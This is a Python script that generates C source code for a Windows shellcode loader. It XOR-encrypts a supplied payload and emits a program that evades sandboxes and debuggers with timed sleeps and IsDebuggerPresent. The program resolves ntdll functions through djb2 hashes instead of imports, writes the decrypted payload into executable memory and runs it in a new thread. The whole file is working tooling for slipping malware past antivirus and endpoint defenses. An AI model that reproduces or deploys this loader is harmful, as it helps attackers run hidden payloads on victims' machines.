#!/usr/bin/python3

from Crypto.Random import get_random_bytes
import argparse
import random

def xor(data, key):
    cipherData = []
    for i in range(len(data)):
        a = data[i]
        k = key[i % len(key)]
        cipherData.append(hex((a ^ k)))
    return cipherData

def printCformat(data):
    formatedData = ""
    for i in data:
        formatedData += ("\\x" + i[2:])
    return "\"" + formatedData + "\""

def byteCformat(data):
    formatedData = ""
    for i in data:
        formatedData += "\\x" + hex(i)[2:]
    
    return "\"" + formatedData + "\""
    


start_prog = """
#include <Windows.h>
#include <tlhelp32.h>


typedef struct _DPC_ENTRY {
    DWORD64 _FunctionAddress;//Pointer of function
    DWORD64 _ApiAddress;//Address of API targeted
    DWORD64 _ApiTarget;//Hash of API ntdll.dll, kernel.dll, ...
    DWORD64 _FuncTarget;//Hash of function NtAllocateVirtualMemory, ....
} _DPC_ENTRY;

typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _INITIAL_TEB {
    PVOID StackBase;
    PVOID StackLimit;
    PVOID StackCommit;
    PVOID StackCommitMax;
    PVOID StackReserved;
} INITIAL_TEB, * PINITIAL_TEB;


typedef NTSTATUS(NTAPI* CustomAlloc)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* CustomWrite)(HANDLE ProcessHandle, PVOID* BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG* NumberOfBytesWritten);
typedef NTSTATUS(NTAPI* CustomCreateThread)(PHANDLE* ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PCLIENT_ID ClientId, PCONTEXT ThreadContext, PINITIAL_TEB InitialTeb, BOOLEAN CreateSuspended);
typedef NTSTATUS(NTAPI* CustomWSOF)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Tiemout);


DWORD64 djb2(PBYTE str)
{
    DWORD64 dwHash = 0x7734773477347734;
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

PVOID GetFuncAddress(DWORD64 _ApiAddr, DWORD64 _FuncHash)
{
    DWORD64 _HeaderAddr = _ApiAddr + ((PIMAGE_DOS_HEADER)_ApiAddr)->e_lfanew;
    PIMAGE_NT_HEADERS64 _NtHeader = (PIMAGE_NT_HEADERS64)_HeaderAddr;
    PIMAGE_EXPORT_DIRECTORY _ExportContent = (PIMAGE_EXPORT_DIRECTORY)(_ApiAddr + _NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    int _NbFuncNtdll = _ExportContent->NumberOfFunctions;

    DWORD* names_RVA_array = (DWORD*)(_ApiAddr + _ExportContent->AddressOfNames);
    DWORD* function_RVA_array = (DWORD*)(_ApiAddr + _ExportContent->AddressOfFunctions);
    WORD* name_ordinals_array = (WORD*)(_ApiAddr + _ExportContent->AddressOfNameOrdinals);

    for (int i = 0; i < _NbFuncNtdll; i++)
    {
        char* funct_name = _ApiAddr + names_RVA_array[i];
        DWORD exported_RVA = function_RVA_array[name_ordinals_array[i]];
        PVOID address = _ApiAddr + function_RVA_array[name_ordinals_array[i]];

        if (djb2(funct_name) == _FuncHash)
        {
            return address;
        }
    }
}

DWORD64 GetApiAddr(DWORD64 _ApiHash)
{
    HANDLE _HSnap = INVALID_HANDLE_VALUE;
    MODULEENTRY32 me32;
    _HSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
    me32.dwSize = sizeof(MODULEENTRY32);

    Module32First(_HSnap, &me32);
    do
    {
        if (djb2(me32.szModule) == _ApiHash)
        {
            return me32.modBaseAddr;
        }
    } while (Module32Next(_HSnap, &me32));
}

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[i % key_len];
    }
}\n\n"""

main_func = """
INT wmain()
{
 Sleep(%%SLEEPTIME%%);
    int _TimeStart = GetTickCount();
    if (_TimeStart < %%SLEEPTIMECHECK%%)
    {
        return 0;
    }

    if (IsDebuggerPresent())
    {
        return 0;
    }
    _DPC_ENTRY CustomAllocStruct = { 0 };
    CustomAlloc	pAlloc = NULL;
    CustomAllocStruct._ApiTarget = 0x5dc35dc35dc35e22;
    CustomAllocStruct._FuncTarget = 0xf5bd373480a6b89b;
    CustomAllocStruct._ApiAddress = GetApiAddr(CustomAllocStruct._ApiTarget);
    pAlloc = GetFuncAddress(CustomAllocStruct._ApiAddress, CustomAllocStruct._FuncTarget);

    _DPC_ENTRY CustomWriteStruct = { 0 };
    CustomWrite pWrite = NULL;
    CustomWriteStruct._ApiTarget = 0x5dc35dc35dc35e22;
    CustomWriteStruct._FuncTarget = 0x68a3c2ba486f0741;
    CustomWriteStruct._ApiAddress = GetApiAddr(CustomWriteStruct._ApiTarget);
    pWrite = GetFuncAddress(CustomWriteStruct._ApiAddress, CustomWriteStruct._FuncTarget);

    _DPC_ENTRY CustomCreateThreadeStruct = { 0 };
    CustomCreateThread pThread = NULL;
    CustomCreateThreadeStruct._ApiTarget = 0x5dc35dc35dc35e22;
    CustomCreateThreadeStruct._FuncTarget = 0x64dc7db288c5015f;
    CustomCreateThreadeStruct._ApiAddress = GetApiAddr(CustomAllocStruct._ApiTarget);
    pThread = GetFuncAddress(CustomCreateThreadeStruct._ApiAddress, CustomCreateThreadeStruct._FuncTarget);

    _DPC_ENTRY CustomWSOFsTRUCT = { 0 };
    CustomWSOF pWSOF = NULL;
    CustomWSOFsTRUCT._ApiTarget = 0x5dc35dc35dc35e22;
    CustomWSOFsTRUCT._FuncTarget = 0xc6a2fa174e551bcb;
    CustomWSOFsTRUCT._ApiAddress = GetApiAddr(CustomAllocStruct._ApiTarget);
    pWSOF = GetFuncAddress(CustomWSOFsTRUCT._ApiAddress, CustomWSOFsTRUCT._FuncTarget);

    //Execute Payload
    LPVOID addr = NULL;
    size_t keySize = 16;
    size_t payloadSize = %%PAYLOADSIZE%%;
    size_t buffSize = %%PAYLOADSIZE%%;
    HANDLE hProc = GetCurrentProcess();
    HANDLE thandle = NULL;
    pAlloc(hProc, &addr, 0, &buffSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    XOR(payload, payloadSize, key, keySize);
    pWrite(hProc, addr, payload, payloadSize, NULL);
    pThread(&thandle, GENERIC_EXECUTE, NULL, hProc, addr, NULL, FALSE, 0, 0, 0, NULL);
    pWSOF(thandle, TRUE, 0);
}      
"""

parser = argparse.ArgumentParser()
parser.add_argument("-b","--bin", help="Path of bin shellcode",type=str,dest='binPath',required=True)
parser.add_argument("-o","--output", help="Path of output payload",type=str,dest='outputPath',required=True)

args = parser.parse_args()
binPath = args.binPath
outputPAth = args.outputPath

f = open(binPath, "rb")
a = f.read()
key = get_random_bytes(16)
c = xor(a, key)
d = "unsigned char payload[] = " + printCformat(c) + ";\n"
f = "unsigned char key[] = " + byteCformat(key) + ";\n"
sleeptime = random.randint(4000, 6000)
main_func =  main_func.replace("%%SLEEPTIME%%", str(sleeptime))
main_func =  main_func.replace("%%SLEEPTIMECHECK%%", str(sleeptime - 20))
main_func =  main_func.replace("%%KEYSIZE%%", str(len(key)))
main_func =  main_func.replace("%%PAYLOADSIZE%%", str(len(c)))

total = start_prog + f + d + main_func

writeOutput = open(outputPAth, "w")
writeOutput.write(total)
